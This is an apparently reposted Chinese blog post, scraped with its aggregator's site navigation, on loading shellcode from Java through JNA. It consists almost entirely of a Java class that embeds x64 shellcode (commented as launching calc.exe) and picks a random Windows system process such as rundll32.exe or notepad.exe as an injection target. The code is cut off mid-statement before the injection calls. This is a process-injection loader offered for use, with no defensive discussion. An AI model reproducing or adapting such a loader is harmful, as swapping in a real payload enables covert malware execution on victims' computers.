---
title: 使用Graalvm加载Shellcode - admin-神风
url: https://buaq.net/go-146127.html
source: unSafe.sh - 不安全
date: 2023-01-19
fetch_date: 2025-10-04T04:14:45.503132
---

# 使用Graalvm加载Shellcode - admin-神风

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![]()

使用Graalvm加载Shellcode - admin-神风

package executeCode;import com.sun.jna.Memory;import com.sun.jna.Native;import com.sun.jna.Poin
*2023-1-18 23:54:0
Author: [www.cnblogs.com(查看原文)](/jump-146127.htm)
阅读量:68
收藏*

---

```
package executeCode;

import com.sun.jna.Memory;
import com.sun.jna.Native;
import com.sun.jna.Pointer;
import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.WinBase;
import com.sun.jna.platform.win32.WinDef;
import com.sun.jna.platform.win32.WinNT;
import com.sun.jna.platform.win32.WinNT.HANDLE;
import com.sun.jna.ptr.IntByReference;
import com.sun.jna.win32.StdCallLibrary;
import com.sun.jna.win32.W32APIOptions;

import java.util.Random;

public class Jna {
    static byte shellcode[] = new byte[]   //pop calc.exe x64
            {
                    (byte) 0xfc, (byte) 0x48, (byte) 0x83, (byte) 0xe4, (byte) 0xf0, (byte) 0xe8, (byte) 0xc0, (byte) 0x00,
                    (byte) 0x00, (byte) 0x00, (byte) 0x41, (byte) 0x51, (byte) 0x41, (byte) 0x50, (byte) 0x52, (byte) 0x51,
                    (byte) 0x56, (byte) 0x48, (byte) 0x31, (byte) 0xd2, (byte) 0x65, (byte) 0x48, (byte) 0x8b, (byte) 0x52,
                    (byte) 0x60, (byte) 0x48, (byte) 0x8b, (byte) 0x52, (byte) 0x18, (byte) 0x48, (byte) 0x8b, (byte) 0x52,
                    (byte) 0x20, (byte) 0x48, (byte) 0x8b, (byte) 0x72, (byte) 0x50, (byte) 0x48, (byte) 0x0f, (byte) 0xb7,
                    (byte) 0x4a, (byte) 0x4a, (byte) 0x4d, (byte) 0x31, (byte) 0xc9, (byte) 0x48, (byte) 0x31, (byte) 0xc0,
                    (byte) 0xac, (byte) 0x3c, (byte) 0x61, (byte) 0x7c, (byte) 0x02, (byte) 0x2c, (byte) 0x20, (byte) 0x41,
                    (byte) 0xc1, (byte) 0xc9, (byte) 0x0d, (byte) 0x41, (byte) 0x01, (byte) 0xc1, (byte) 0xe2, (byte) 0xed,
                    (byte) 0x52, (byte) 0x41, (byte) 0x51, (byte) 0x48, (byte) 0x8b, (byte) 0x52, (byte) 0x20, (byte) 0x8b,
                    (byte) 0x42, (byte) 0x3c, (byte) 0x48, (byte) 0x01, (byte) 0xd0, (byte) 0x8b, (byte) 0x80, (byte) 0x88,
                    (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x48, (byte) 0x85, (byte) 0xc0, (byte) 0x74, (byte) 0x67,
                    (byte) 0x48, (byte) 0x01, (byte) 0xd0, (byte) 0x50, (byte) 0x8b, (byte) 0x48, (byte) 0x18, (byte) 0x44,
                    (byte) 0x8b, (byte) 0x40, (byte) 0x20, (byte) 0x49, (byte) 0x01, (byte) 0xd0, (byte) 0xe3, (byte) 0x56,
                    (byte) 0x48, (byte) 0xff, (byte) 0xc9, (byte) 0x41, (byte) 0x8b, (byte) 0x34, (byte) 0x88, (byte) 0x48,
                    (byte) 0x01, (byte) 0xd6, (byte) 0x4d, (byte) 0x31, (byte) 0xc9, (byte) 0x48, (byte) 0x31, (byte) 0xc0,
                    (byte) 0xac, (byte) 0x41, (byte) 0xc1, (byte) 0xc9, (byte) 0x0d, (byte) 0x41, (byte) 0x01, (byte) 0xc1,
                    (byte) 0x38, (byte) 0xe0, (byte) 0x75, (byte) 0xf1, (byte) 0x4c, (byte) 0x03, (byte) 0x4c, (byte) 0x24,
                    (byte) 0x08, (byte) 0x45, (byte) 0x39, (byte) 0xd1, (byte) 0x75, (byte) 0xd8, (byte) 0x58, (byte) 0x44,
                    (byte) 0x8b, (byte) 0x40, (byte) 0x24, (byte) 0x49, (byte) 0x01, (byte) 0xd0, (byte) 0x66, (byte) 0x41,
                    (byte) 0x8b, (byte) 0x0c, (byte) 0x48, (byte) 0x44, (byte) 0x8b, (byte) 0x40, (byte) 0x1c, (byte) 0x49,
                    (byte) 0x01, (byte) 0xd0, (byte) 0x41, (byte) 0x8b, (byte) 0x04, (byte) 0x88, (byte) 0x48, (byte) 0x01,
                    (byte) 0xd0, (byte) 0x41, (byte) 0x58, (byte) 0x41, (byte) 0x58, (byte) 0x5e, (byte) 0x59, (byte) 0x5a,
                    (byte) 0x41, (byte) 0x58, (byte) 0x41, (byte) 0x59, (byte) 0x41, (byte) 0x5a, (byte) 0x48, (byte) 0x83,
                    (byte) 0xec, (byte) 0x20, (byte) 0x41, (byte) 0x52, (byte) 0xff, (byte) 0xe0, (byte) 0x58, (byte) 0x41,
                    (byte) 0x59, (byte) 0x5a, (byte) 0x48, (byte) 0x8b, (byte) 0x12, (byte) 0xe9, (byte) 0x57, (byte) 0xff,
                    (byte) 0xff, (byte) 0xff, (byte) 0x5d, (byte) 0x48, (byte) 0xba, (byte) 0x01, (byte) 0x00, (byte) 0x00,
                    (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x48, (byte) 0x8d, (byte) 0x8d,
                    (byte) 0x01, (byte) 0x01, (byte) 0x00, (byte) 0x00, (byte) 0x41, (byte) 0xba, (byte) 0x31, (byte) 0x8b,
                    (byte) 0x6f, (byte) 0x87, (byte) 0xff, (byte) 0xd5, (byte) 0xbb, (byte) 0xf0, (byte) 0xb5, (byte) 0xa2,
                    (byte) 0x56, (byte) 0x41, (byte) 0xba, (byte) 0xa6, (byte) 0x95, (byte) 0xbd, (byte) 0x9d, (byte) 0xff,
                    (byte) 0xd5, (byte) 0x48, (byte) 0x83, (byte) 0xc4, (byte) 0x28, (byte) 0x3c, (byte) 0x06, (byte) 0x7c,
                    (byte) 0x0a, (byte) 0x80, (byte) 0xfb, (byte) 0xe0, (byte) 0x75, (byte) 0x05, (byte) 0xbb, (byte) 0x47,
                    (byte) 0x13, (byte) 0x72, (byte) 0x6f, (byte) 0x6a, (byte) 0x00, (byte) 0x59, (byte) 0x41, (byte) 0x89,
                    (byte) 0xda, (byte) 0xff, (byte) 0xd5, (byte) 0x63, (byte) 0x61, (byte) 0x6c, (byte) 0x63, (byte) 0x2e,
                    (byte) 0x65, (byte) 0x78, (byte) 0x65, (byte) 0x00
            };

    static Kernel32 kernel32;
    static IKernel32 iKernel32;
    public static String[] ProcessArrayx32 = {"C:\\Windows\\SysWOW64\\ARP.exe", "C:\\Windows\\SysWOW64\\at.exe", "C:\\Windows\\SysWOW64\\auditpol.exe", "C:\\Windows\\SysWOW64\\bitsadmin.exe", "C:\\Windows\\SysWOW64\\bootcfg.exe", "C:\\Windows\\SysWOW64\\ByteCodeGenerator.exe", "C:\\Windows\\SysWOW64\\cacls.exe", "C:\\Windows\\SysWOW64\\chcp.com", "C:\\Windows\\SysWOW64\\CheckNetIsolation.exe", "C:\\Windows\\SysWOW64\\chkdsk.exe", "C:\\Windows\\SysWOW64\\choice.exe", "C:\\Windows\\SysWOW64\\cmdkey.exe", "C:\\Windows\\SysWOW64\\comp.exe", "C:\\Windows\\SysWOW64\\diskcomp.com", "C:\\Windows\\SysWOW64\\Dism.exe", "C:\\Windows\\SysWOW64\\esentutl.exe", "C:\\Windows\\SysWOW64\\expand.exe", "C:\\Windows\\SysWOW64\\fc.exe", "C:\\Windows\\SysWOW64\\find.exe", "C:\\Windows\\SysWOW64\\gpresult.exe"};
    public static String[] ProcessArrayx64 = {"C:\\Windows\\System32\\rundll32.exe", "C:\\Windows\\System32\\find.exe", "C:\\Windows\\System32\\notepad.exe", "C:\\Windows\\System32\\ARP.EXE"};

    static {
        kernel32 = (Kernel32) Native.loadLibrary(Kernel32.class, W32APIOptions.UNICODE_OPTIONS);
        iKernel32 = (IKernel32) Native.loadLibrary("kernel32", IKernel32.class);
    }

    public static void main(String[] args) {
        Jna jnaLoader = new Jna();
        boolean is64 = true;

        System.out.println("\nShellcode: \n" + shellcode);
        jnaLoader.loadShellCode(shellcode, is64);
    }

    public void loadShellCode(byte[] shellcodeHex, boolean is64) {

        String[] targetProcessArray = null;
        // java是64位且选择注入64位shellcode
        if (System.getProperty("sun.arch.data.model").equals("64") && is64) {
            targetProcessArray = ProcessArrayx64;
        } else { //默认注入32位进程
            targetProcessArray = ProcessArrayx32;
        }
        int j = targetProcessArray.length;
        byte b = 0;
        Random random = new Random();
        int k = b + random.nextInt(j);
        String targetProcess = targetProcessArray[k];
        this.loadShellCode(shellcodeHex, targetProcess);

    }

    public void loadShellCode(byte[] shellcodeByte, String targetProcess) {
        System.out.println("targetProcess: " + targetProcess);
        int shellcodeSize = shellcodeByte.length;
        IntByReference intByReference = new IntByReference(0);
        Memory memory = new Memory((long) shellcodeSize);

        for (int j = 0; j < shellcodeSize; ++j) {
            memory.setByte((long) j, shellcodeByte[j]);
        }

        WinBase.PROCE...